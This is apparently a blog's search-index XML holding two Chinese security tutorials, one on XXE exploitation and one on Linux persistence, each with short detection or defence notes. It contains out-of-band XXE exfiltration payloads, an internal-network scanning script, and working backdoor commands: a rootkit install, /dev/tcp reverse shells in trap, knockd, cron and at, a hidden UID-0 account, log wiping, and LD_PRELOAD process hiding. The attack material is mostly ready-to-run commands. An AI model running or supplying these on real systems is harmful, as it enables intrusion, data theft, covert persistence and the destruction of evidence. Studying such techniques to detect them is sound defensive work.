<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>理解和利用XXE</title>
    <link href="/2019/12/29/XXE/"/>
    <url>/2019/12/29/XXE/</url>
    
    <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>介绍dtd，一句话说就是用来规范xml中的标签和内容（元素和属性）<br><img src="/img/xxe1.png" srcset="/img/loading.gif" alt="dtd"><br>而XXE漏洞就出现在调用dtd</p><blockquote><p>&lt;!ENTITY xxe SYSTEM “file:///c:/test.dtd” &gt;  </p></blockquote><p>就像这里，调用了c盘的test.dtd来规范我们的xml，但此时换成读其他文件，就造成了安全问题。</p><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="内部-外部"><a href="#内部-外部" class="headerlink" title="内部/外部"></a>内部/外部</h3><p>内部：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre><p>外部：  </p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;&lt;creds&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;    &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>从外部应用dtd文件，方便资源更新。<br>也可从公共dtd引用</p><blockquote><p>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;  </p></blockquote><p>外部引用可支持http，file等协议，不同的语言支持的协议不同.</p><h3 id="通用-参数"><a href="#通用-参数" class="headerlink" title="通用/参数"></a>通用/参数</h3><p><strong>通用实体</strong>:在dtd定义，xml引用。<br>定义：</p><blockquote><p>&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;  </p></blockquote><p>引用：  </p><blockquote><p>&amp;实体名称；</p></blockquote><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt; &lt;updateProfile&gt;      &lt;firstname&gt;Joe&lt;/firstname&gt;      &lt;lastname&gt;&amp;file;&lt;/lastname&gt;      ... &lt;/updateProfile&gt;</code></pre><p><strong>参数实体</strong>:dtd中定义，dtd中引用<br>定义：</p><blockquote><p>&lt;!ENTITY % 实体名称 “实体的值”&gt;<br>&lt;!ENTITY % 实体名称 SYSTEM “URI/URL”&gt;</p></blockquote><p>引用：  </p><blockquote><p>%实体名称；  </p></blockquote><p>ps：定义时%后有个空格，引用没有。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="无回显读取文件"><a href="#无回显读取文件" class="headerlink" title="无回显读取文件"></a>无回显读取文件</h3><p>test.dtd</p><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:9999?p=%file;&#39;&gt;&quot;&gt;</code></pre><p>payload:</p><pre><code>&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt;</code></pre><p>在攻击机上监听9999端口就能获取所读文件   </p><p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 &amp;#37;)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p><h3 id="有回显读取特殊内容文件"><a href="#有回显读取特殊内容文件" class="headerlink" title="有回显读取特殊内容文件"></a>有回显读取特殊内容文件</h3><p>当读取当文件内容包含&lt;&gt;&amp;“之类等字符，为了不让xml解析器解析，使用CDATA去标示。此处采用参数实体。<br>evil.dtd</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code></pre><p>payload</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre><h3 id="探测内网"><a href="#探测内网" class="headerlink" title="探测内网"></a>探测内网</h3><p>可理解为ssrf，通过XXE的方式实现ssrf。</p><h4 id="探测ip"><a href="#探测ip" class="headerlink" title="探测ip"></a>探测ip</h4><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE creds [  &lt;!ENTITY goodies SYSTEM &quot;php://filter/convert.base64-encode/resource=http://127.0.0.0&quot;&gt; ]&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>根据响应时间判断存活。利用脚本或bp重放探测。<br>脚本</p><pre><code>import requestsimport base64#Origtional XML that the server accepts#&lt;xml&gt;#    &lt;stuff&gt;user&lt;/stuff&gt;#&lt;/xml&gt;def build_xml(string):    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;    send_xml(xml)def send_xml(xml):    headers = {&#39;Content-Type&#39;: &#39;application/xml&#39;}    x = requests.post(&#39;http://34.200.157.128/CUSTOM/NEW_XEE.php&#39;, data=xml, headers=headers, timeout=5).text    coded_string = x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value    print coded_string#   print base64.b64decode(coded_string)for i in range(1, 255):    try:        i = str(i)        ip = &#39;10.0.0.&#39; + i        string = &#39;php://filter/convert.base64-encode/resource=http://&#39; + ip + &#39;/&#39;        print string        build_xml(string)    except:continue</code></pre><h4 id="探测端口"><a href="#探测端口" class="headerlink" title="探测端口"></a>探测端口</h4><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE creds [  &lt;!ENTITY goodies SYSTEM &quot;php://filter/convert.base64-encode/resource=http://127.0.0.1:22&quot;&gt; ]&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><h4 id="探测内网web"><a href="#探测内网web" class="headerlink" title="探测内网web"></a>探测内网web</h4><p>1.读web源码<br>2.通过jar协议上传文件；通过ftp协议结合 CRLF 注入攻击SMTP服务器等<br>不同环境和平台可利用协议：<br><img src="/img/xxe2.png" srcset="/img/loading.gif" alt="dtd"> </p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>1.文件上传解析处<br>现代Excel文件实际上只是XML文档的zip文件。这称为Office Open XML格式或OOXML。<br>许多应用程序允许上传文件。有些处理内部数据并采取相应的操作，这几乎肯定需要解析XML。如果解析器未安全配置，则XXE几乎是不可避免的。  </p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><a href="https://www.freebuf.com/vuls/194489.html" target="_blank" rel="noopener">从Blind XXE漏洞到读取Root文件的系统提权</a></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>1.禁用外部实体<br>如php：<br>libxml_disable_entity_loader(true);<br>2.过滤关键字</p><p>参考：<br><a href="https://xz.aliyun.com/t/3357#toc-21" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-21</a><br><a href="https://www.cnblogs.com/flokz/p/xxe.html" target="_blank" rel="noopener">https://www.cnblogs.com/flokz/p/xxe.html</a><br><a href="https://www.uedbox.com/post/28999/" target="_blank" rel="noopener">https://www.uedbox.com/post/28999/</a><br><a href="https://blog.csdn.net/q547550831/article/details/50541424" target="_blank" rel="noopener">https://blog.csdn.net/q547550831/article/details/50541424</a></p><p>思考：<br>1.无回显读文件时  </p><blockquote><p>&lt;!ENTITY % int “&lt;!ENTITY % send SYSTEM ‘<a href="http://ip:9999?p=%file;&#39;&gt;&quot;&gt;" target="_blank" rel="noopener">http://ip:9999?p=%file;&#39;&gt;&quot;&gt;</a>  </p></blockquote><p>为什么在实体中建实体，为什么</p><blockquote><p>&lt;!ENTITY % int “<a href="http://ip:9999?p=%file;&quot;&gt;" target="_blank" rel="noopener">http://ip:9999?p=%file;&quot;&gt;</a>   </p></blockquote><p>不行    </p><blockquote><p>定义int变量，它只是起到穿插作用，目的是编译里面的实体send；<br>在%file处访问资源，并将该位置的内容 加载到实体send。 </p></blockquote><p>2.xml解析和传递流程</p>]]></content>
    
    
    
    <tags>
      
      <tag>XXE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux持久化及安全检测</title>
    <link href="/2019/12/21/linux%E6%8C%81%E4%B9%85%E5%8C%96/"/>
    <url>/2019/12/21/linux%E6%8C%81%E4%B9%85%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="linux持久化及安全检测"><a href="#linux持久化及安全检测" class="headerlink" title="linux持久化及安全检测"></a>linux持久化及安全检测</h1><p>结合<a href="http://vulhub.org.cn/attack" target="_blank" rel="noopener">ATT&amp;CK</a>和网上一些资料做了些持久化总结，供学习和交流，如有不足处，欢迎斧正。<strong>勿用于非法途径，否则后果自负。</strong></p><h2 id="1-Rootkit"><a href="#1-Rootkit" class="headerlink" title="1.    Rootkit"></a>1.    Rootkit</h2><p>rootkit分为内核级和应用级两种。<br>内核级的rootkit很多，比如：Diamorphine<br>应用级的rootkit也很多，比如：Mafix</p><h3 id="Mafix"><a href="#Mafix" class="headerlink" title="Mafix"></a>Mafix</h3><p>条件:root权限shell<br>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。应用级rookit，主要替换ls、ps、netstat命令来隐藏文件(利用/proc?)</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><pre><code>wget http://forum.eviloctal.com/attachment.php?aid=13419tar zvxf mafix.tar.gzcd mafixchmod +x root./root password port</code></pre><p><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.1.png" srcset="/img/loading.gif" alt="1.1"><br>安装完成，自动删除安装程序<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.2.png" srcset="/img/loading.gif" alt="1.2"><br>netstat -an|grep 20000<br>检验安装情况</p><p>windows putty登录后门<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.3.png" srcset="/img/loading.gif" alt="1.3"><br>登陆成功日志<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.4.png" srcset="/img/loading.gif" alt="1.4"></p><h4 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h4><p>清理命令记录：<br>(1)仅清理当前用户： history -c<br>(2)使系统不再保存命令记录：vi /etc/profile，找到HISTSIZE这个值，修改为0<br>(3)删除记录<br>删除登录失败记录：echo&gt;/var/log/btmp<br>删除登录成功记录：echo&gt;/var/log/wtmp （此时执行last命令就会发现没有记录）删除日志记录：echo &gt; /var/log/secure  </p><h4 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h4><blockquote><p>Rkhunter</p></blockquote><p>Rkhunter的中文名叫“Rootkit猎手”, 目前可以发现大多数已知的rootkits和一些嗅探器以及后门程序. 它通过执行一系列的测试脚本来确认服务器是否已经感染rootkits. 比如检查rootkits使用的基本文件, 可执行二进制文件的错误文件权限, 检测内核模块等等。<br>rkhunter -c<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.5.png" srcset="/img/loading.gif" alt="1.5"><br>ssh的远程root登陆开启了，默认是不允许直接root登陆的</p><blockquote><p>Chkrootkit  </p></blockquote><p>当然如果只是用Rkhunter检查扫描还是不够权威，再来安装一款检查下吧，chkrootkit 是一款小巧易用的Unix平台上的可以检测多种rootkit入侵的工具。它的功能包括检测文件修改、utmp/wtmp/last日志修改、界面欺骗(promiscuous interfaces)、恶意核心模块(maliciouskernel modules)。<br>直接运行可以对系统进行检测： /usr/local/chkrootkit/chkrootkit（./chkrootkit -n）<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.6.png" srcset="/img/loading.gif" alt="1.6"><br>也可以./chkrootkit | grep INFECTED<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.7.png" srcset="/img/loading.gif" alt="1.7"><br>出现INFECTED就说明系统可能有问题了</p><h2 id="2-Trap"><a href="#2-Trap" class="headerlink" title="2.    Trap"></a>2.    Trap</h2><p>trap 命令使程序和 shell 可以指定接收中断信号时执行的命令。 一种常见的情况是脚本允许正常终止和处理常见的键盘中断，如 ctrl+c 和 ctrl+d。当 shell 遇到特定的中断时，攻击者可以使用它来注册要执行的代码，以获得执行或作为持久性机制。 Trap 命令的格式如下：trap“命令列表”signals，当接收时到“signals”，将执行“命令列表”。 </p><h3 id="trap命令"><a href="#trap命令" class="headerlink" title="trap命令"></a>trap命令</h3><p>trap命令是专用于捕捉信号的。比如像Ctrl+C组合键会产生SIGINT信号，Ctrl+Z会产生SIGTSTP信号发送给终端等。在捕捉到信号之后，可以进行一系列的操作。<br><strong>用法</strong>：trap ‘command’ signals<br>比如：trap “echo ‘You pressed the ctrl+c ‘“ INT<br> 当按下ctrl+c，输出”You pressed the ctrl+c”<br>trap -l查看其他信号</p><h3 id="trap后门"><a href="#trap后门" class="headerlink" title="trap后门"></a>trap后门</h3><p>编写shell脚本：<br>test.sh</p><pre><code>#!/bin/bash  # test trap command  trap &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1&quot; SIGINT  //payloadecho This is a test script  count=1  while [ $count -le 10 ]  do    echo &quot;hu $count&quot;    sleep 1    count=$[ $count + 1 ]  done  echo The end.  </code></pre><p>运行test脚本，当我们执行中断信号(ctrl+c)的时候，触发trap。<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%962.1.png" srcset="/img/loading.gif" alt="2.1"><br>成功反弹shell。<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%962.2.png" srcset="/img/loading.gif" alt="2.2"><br><strong>安全检测</strong><br>必须为 shell 或程序注册 trap 命令，因此它们出现在文件中。 监视文件是否存在可疑或过于宽泛的 trap 命令可以减少调查期间的可疑行为。 监视通过 trap 中断执行的可疑进程。<br>参考<br><a href="https://www.cnblogs.com/FengGeBlog/p/10407221.html" target="_blank" rel="noopener">https://www.cnblogs.com/FengGeBlog/p/10407221.html</a></p><h2 id="3-端口敲击"><a href="#3-端口敲击" class="headerlink" title="3.    端口敲击"></a>3.    端口敲击</h2><h3 id="什么是knock"><a href="#什么是knock" class="headerlink" title="什么是knock"></a>什么是knock</h3><p>端口敲击是一种较为成熟的技术，目的是隐藏开放的端口以控制访问，攻击者和防御者均可使用。 为了启用端口，攻击者需发送一系列具有特定特征的数据包。 通常，这些数据包包含关闭端口预定义的尝试序列，这可能涉及不常见的标志、特定的字符串或其他特征。 完成序列，通常由基于主机的防火墙开启端口，但也可以由自定义软件打开。 在动态开启监听端口和在不同系统上启动与监听服务器的连接时，都可以见到该技术。 可以通过不同的方法观察引发通信的数据包。 一种方法（最初由 Cd00r 实现）是使用 libpcap 库嗅探有问题的包。 另一种方法利用了原始套接字，这使得恶意软件可以使用供其他程序使用的开放端口。<br>Knocked工具安装<br>环境：centos7<br>下载knocked <a href="http://www.zeroflux.org/projects/knock" target="_blank" rel="noopener">http://www.zeroflux.org/projects/knock</a></p><ol><li>wget <a href="http://404-1252074372.cosgz.myqcloud.com/knockd/knock-0.7-1.el7.src.rpm" target="_blank" rel="noopener">http://404-1252074372.cosgz.myqcloud.com/knockd/knock-0.7-1.el7.src.rpm</a></li><li>安装rpmbuild：yum install -y rpm-build</li><li>安装 libpcap-devel：yum install -y libpcap-devel</li><li>安装gcc：yum install -y gcc</li><li>编译knockd：rpmbuild –rebuild knock-0.7-1.el7.src.rpm </li><li>安装knockd：rpm -ivh /root/rpmbuild/RPMS/x86_64/knock-*<br>此时knocked安装成功。<br>最后</li><li>根据自己的需要进行配置：/etc/knockd.conf</li><li>启动knocked服务： /etc/init.d/knockd start<br>作为安全管理工具，knocked可以隐藏自己的端口，当管理员正确敲击端口”密码序列”，knocked打开预先设定好的端口，让管理员访问。<br>比如管理员想要用手中的设备进行ssh连接，knocked配置如下：<pre><code>[options]    LogFile = /var/log/knockd.log  //日志地址       </code></pre></li></ol><p>[opencloseSSH]<br>        sequence = 1000,1001,1002<br>        seq_timeout   = 15<br>        tcpflags = syn<br>        start_command = iptables -I INPUT -s %IP% -p tcp –dport ssh -j ACCEPT<br>        cmd_timeout   = 10<br>        stop_command  = /sbin/iptables -D INPUT -s %IP% -p tcp –dport ssh -j ACCEPT  </p><pre><code>当依次敲击1000，1001，1002三个端口后，服务器添加一条iptables规则iptables -I INPUT -s %IP% -p tcp --dport ssh -j ACCEPT，允许敲击正确的ip通过ssh端口访问服务器。端口敲击序列  ![3.1](/img/持久化3.1.png)   查看日志(/var/log/knockd.log)，判断是否敲击成功  如果第一个暗号被接受了，会记录下来：  xxx.xxx.xxx.xxx : opencloseSSH: Stage 1  后依次接收第二第三个暗号，成功执行opencloseSSH  ![3.2](/img/持久化3.2.png)   knocked日志  遇到的坑：  每次更改配置记得restart服务如果接收不到，可能是部分端口被禁止了，或者没开icmp（如果是vps上搭建，多半是这个原因，去改安全策略）### Knock后门利用knocked可以构建我们的后门在knocked加入一个功能：</code></pre><p>[Bounce shell]<br>        sequence = 1000,1001,1002<br>        seq_timeout = 30<br>        tcpflags = syn<br>        tart_command = bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1  </p><p>```  </p><p>在我们的攻击机上开启监听：nc -lvp 2333<br>依次敲击1000 1001 1002，反弹shell<br> <img src="/img/%E6%8C%81%E4%B9%85%E5%8C%963.3.png" srcset="/img/loading.gif" alt="3.3">   </p><h3 id="安全检测-1"><a href="#安全检测-1" class="headerlink" title="安全检测"></a>安全检测</h3><p>记录查看发送到系统和从系统发出的网络数据包，查找不属于已建立的无关数据包。<br>参考<br><a href="https://cloud.tencent.com/developer/article/1005328" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1005328</a><br><a href="http://vulhub.org.cn/attack/techniques/T1205.md" target="_blank" rel="noopener">http://vulhub.org.cn/attack/techniques/T1205.md</a></p><h2 id="4-新建账户"><a href="#4-新建账户" class="headerlink" title="4.    新建账户"></a>4.    新建账户</h2><p>具有足够访问级别的攻击者可以创建本地系统或域帐户。 这些帐户可用持久化，不需要在系统上部署持久远程访问工具。  </p><h3 id="useradd命令和两个文件"><a href="#useradd命令和两个文件" class="headerlink" title="useradd命令和两个文件"></a>useradd命令和两个文件</h3><p><strong>useradd</strong><br>条件：超级用户权限<br>格式：useradd [-d home] [-s shell] [-c comment] [-m [-k template]] [-f inactive] [-e expire ] [-p passwd] [-r] name<br>参数：<br>-c：加上备注文字，备注文字保存在passwd的备注栏中。<br>　　-d：指定用户登入时的主目录，替换系统默认值/home/&lt;用户名&gt;<br>　　-D：变更预设值。<br>　　-e：指定账号的失效日期，日期格式为MM/DD/YY，例如06/30/12。缺省表示永久有效。<br>　　-f：指定在密码过期后多少天即关闭该账号。如果为0账号立即被停用；如果为-1则账号一直可用。默认值为-1.<br>　　-g：指定用户所属的群组。值可以使组名也可以是GID。用户组必须已经存在的，期默认值为100，即users。<br>　　-G：指定用户所属的附加群组。<br>　　-m：自动建立用户的登入目录。<br>　　-M：不要自动建立用户的登入目录。<br>　　-n：取消建立以用户名称为名的群组。<br>　　-r：建立系统账号。<br>-s：指定用户登入后所使用的shell。默认值为/bin/bash。<br>例如：<br>建立一个新用户账户testuser1，并设置UID为544，主目录为/usr/testuser1，属于users组：<br>#useradd -u 544 -d /usr/testuser1  -g users -m  testuser1  </p><p><strong>/etc/passwd和/etc/shadow</strong><br>/etc/passwd：用户信息<br>文件各字段   用户名：密码：用户ID：组ID：身份描述：用户的家目录：用户登录后所使用的SHELL</p><p>/etc/shadow：用户密码信息<br>文件各字段  用户名：密码的MD5加密值：数字表示自系统使用以来口令被修改的天数：数字表示口令的最小修改间隔：数字表示口令更改的周期：数字表示口令失效的天数：数字表示口令失效以后帐号会被锁定多少天：用户帐号到期时间：保留字段尚未使用<br>新建账户<br>环境：<br>Centos 7(靶机)<br>Ubuntu 16(攻击机）<br>Useradd -o -u 0 backdoor # 添加账户“backdoor” UID为0（root权限）<br>echo “123456” | passwd –stdin backdoor      # 设置密码  </p><p>通过ssh远程登录backdoor账户</p><h3 id="安全检测-2"><a href="#安全检测-2" class="headerlink" title="安全检测"></a>安全检测</h3><p>收集建立账户的数据，定期检查自己的账户。</p><p>参考<br><a href="https://www.cnblogs.com/EdwinChan/p/8350879.html" target="_blank" rel="noopener">https://www.cnblogs.com/EdwinChan/p/8350879.html</a></p><h2 id="5-隐藏文件和目录"><a href="#5-隐藏文件和目录" class="headerlink" title="5.    隐藏文件和目录"></a>5.    隐藏文件和目录</h2><h3 id="隐藏文件和目录"><a href="#隐藏文件和目录" class="headerlink" title="隐藏文件和目录"></a>隐藏文件和目录</h3><p>Linux下创建文件和目录，在命名前加一个“.“代表隐藏。<br>touch .webshell.php 创建名字为 .webshell.php 的文件<br>mkdir …/ 创建名字为 … 的文件夹<br>ls命令无法查看，ls -a可查看隐藏文件及目录</p><h3 id="隐藏历史操作命令"><a href="#隐藏历史操作命令" class="headerlink" title="隐藏历史操作命令"></a>隐藏历史操作命令</h3><p>1.关闭当前记录<br>关闭 set +o history<br>开启 set -o history<br>Ps：命令前加空格，命令本身也不会被记录。<br>2.清除历史记录<br>查看历史记录：#history<br>历史记录保存的位置：#cat /root/.bash_history  </p><h3 id="端口隐藏"><a href="#端口隐藏" class="headerlink" title="端口隐藏"></a>端口隐藏</h3><p><strong>通过端口复用来隐藏端口</strong>  </p><h4 id="1-SSLH"><a href="#1-SSLH" class="headerlink" title="1.SSLH"></a>1.SSLH</h4><p>安装SSLH<br> sudo apt-get install sslh<br>配置SSLH<br> 编辑 SSLH 配置文件：<br> sudo vi /etc/default/sslh  </p><p> 找到下列行：Run=no  将其修改为：Run=yes<br> 修改以下行以允许 SSLH 在所有可用接口上侦听端口 443<br> DAEMON_OPTS=”–user sslh –listen 0.0.0.0:443 –ssh 127.0.0.1:22 –ssl 127.0.0.1:443 –pidfile /var/run/sslh/sslh.pid”<br><strong>安全检测</strong></p><p>ps -ef | grep sslh 查看端口</p><h4 id="2-iptables"><a href="#2-iptables" class="headerlink" title="2.iptables"></a>2.iptables</h4><p>端口复用链<br>iptables -t nat -N LETMEIN<br>端口复用规则<br>iptables -t nat  -A LETMEIN -p tcp -j REDIRECT –to-port 22<br>开启开关<br>iptables -A INPUT -p tcp -m string –string ‘threathuntercoming’ –algo bm -m recent –set –name letmein –rsource -j ACCEPT<br>关闭开关<br>iptables -A INPUT -p tcp -m string –string ‘threathunterleaving’ –algo bm -m recent –name letmein –remove -j ACCEPT<br>let’s do it<br>iptables -t nat -A PREROUTING -p tcp –dport 80 –syn -m recent –rcheck –seconds 3600 –name letmein –rsource -j LETMEIN  </p><p><strong>利用方式:</strong><br>开启复用<br>echo threathuntercoming | socat - tcp:192.168.28.128:80<br>ssh使用80端口进行登录<br>ssh -p 80 <a href="mailto:root@192.168.28.128">root@192.168.28.128</a><br>关闭复用<br>echo threathunterleaving | socat - tcp:192.168.28.128:80<br>具体参考：<br><a href="https://www.freebuf.com/articles/network/137683.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/137683.html</a></p><h3 id="隐藏进程"><a href="#隐藏进程" class="headerlink" title="隐藏进程"></a>隐藏进程</h3><p><strong>Libprocesshider</strong><br>利用 LD_PRELOAD 来实现系统函数的劫持<br>下载程序编译<br>git clone <a href="https://github.com/gianlucaborello/libprocesshider.git" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider.git</a><br>cd libprocesshider/ &amp;&amp; make<br>移动文件到/usr/local/lib/目录下<br>cp libprocesshider.so /usr/local/lib/<br>把它加载到全局动态连接局<br>echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload  </p><p>运行evil_script.py测试<br>./evil_script.py 127.0.0.1 2333<br>Top命令无法找到evil_script.py  </p><p><strong>安全检测</strong><br>unhide 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。<br>安装<br>sudo yum install unhide<br>使用<br>unhide [options] test_list<br> <img src="/img/%E6%8C%81%E4%B9%85%E5%8C%965.1.png" srcset="/img/loading.gif" alt="5.1">   </p><h2 id="6-预加载型恶意动态链接库"><a href="#6-预加载型恶意动态链接库" class="headerlink" title="6.    预加载型恶意动态链接库"></a>6.    预加载型恶意动态链接库</h2><p>动态链接库预加载机制是系统提供给用户运行自定义动态链接库的一种方式，在可执行程序运行之前就会预先加载用户定义的动态链接库的一种技术，这种技术可以重写系统的库函数，这种技术可以用来重写系统中有漏洞的库函数，达到修复漏洞的目的，但也可以被用来劫持。<br> <img src="/img/%E6%8C%81%E4%B9%85%E5%8C%966.1.png" srcset="/img/loading.gif" alt="6.1">    </p><p>LD_PRELOAD （用于预加载的环境变量）<br>LD_PRELOAD环境变量是会及时生效的<br>LD_PRELOAD=/lib/evil.so #LD_PRELOAD的值设置为要预加载的动态链接库<br>export LD_PRELOAD        #导出环境变量使该环境变量生效<br>unset LD_PRELOAD         #解除设置的LD_PRELOAD环境变量<br>常用工具：cub3 <a href="https://github.com/mempodippy/cub3" target="_blank" rel="noopener">https://github.com/mempodippy/cub3</a><br>/etc/ld.so.preload （用于预加载的配置文件）<br>将恶意so文件写入/etc/ld.so.preload就行:<br>echo “/lib/evil.so” &gt; /etc/ld.so.preload<br>常用工具：Vlany  <a href="https://github.com/mempodippy/vlany" target="_blank" rel="noopener">https://github.com/mempodippy/vlany</a>  </p><h3 id="安全检测-3"><a href="#安全检测-3" class="headerlink" title="安全检测"></a>安全检测</h3><p>通过strace命令去跟踪预加载的文件是否为/etc/ld.so.preload，以及文件中是否有异常的动态链接库,文件完整性校验。以及检查是否设置LD_PRELOAD环境变量(echo $LD_PRELOAD)等。</p><h2 id="7-本地作业调度"><a href="#7-本地作业调度" class="headerlink" title="7.    本地作业调度"></a>7.    本地作业调度</h2><p>本地作业调度就是常说的计划任务</p><h3 id="cron"><a href="#cron" class="headerlink" title="cron"></a>cron</h3><p>通过修改/etc/crontab，/etc/cron.d/目录或 Cron 守护进程支持的其他位置可以安装系统级的 cron 作业。而每个用户的 Cron 作业是通过 crontab 使用具有特定格式的 crontab 文件安装的。­它在 macOS 和 Linux 系统上都有效。<br>这些方法允许在没有用户交互的情况下在后台以特定的周期间隔执行命令或脚本。攻击者可以利用作业调度在系统启动时执行程序或为了持久性而在预定的基础上执行程序， 作为横向移动的一部分执行，获取 root 权限，或者在特定帐户的上下文中运行进程。  </p><p>靶机上设定计划任务：<br>(crontab -l;echo ‘*/1 * * * * exec 9&lt;&gt; /dev/tcp/127.0.0.1/2333;exec 0&lt;&9;exec 1&gt;&amp;9 2&gt;&1;/bin/bash –noprofile -i’)|crontab -  </p><p>1分钟后攻击机上成功监听：  </p><h3 id="at"><a href="#at" class="headerlink" title="at"></a>at</h3><p>at 程序是另一种方式，基于 POSIX 的系统（包括 macOS 和 Linux)。用于将程序或脚本作业安排在之后的日期和/或时间执行的一次性任务(cron多次)。<br>[root@localhost ~]# date             # 查看当前时间<br>[root@localhost ~]# at 00:27        # 创建at计划任务  +  时间<br>at&gt; bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1                    # 在08：26  bash命令反弹shell<br>at&gt; &lt;EOT&gt;                            # Ctrl+D  结束    </p><p>8：26攻击机上成功监听</p><h3 id="安全检测-4"><a href="#安全检测-4" class="headerlink" title="安全检测"></a>安全检测</h3><p>一般通过crontab -l（at -l等）命令即可检测到定时任务后门。不同的linux发行版可能查看开机启动项的文件不大相同，Debian系linux系统一般是通过查看/etc/init.d目录有无最近修改和异常的开机启动项。而Redhat系的linux系统一般是查看/etc/rc.d/init.d或者/etc/systemd/system等目录。</p><h2 id="8-Openssh"><a 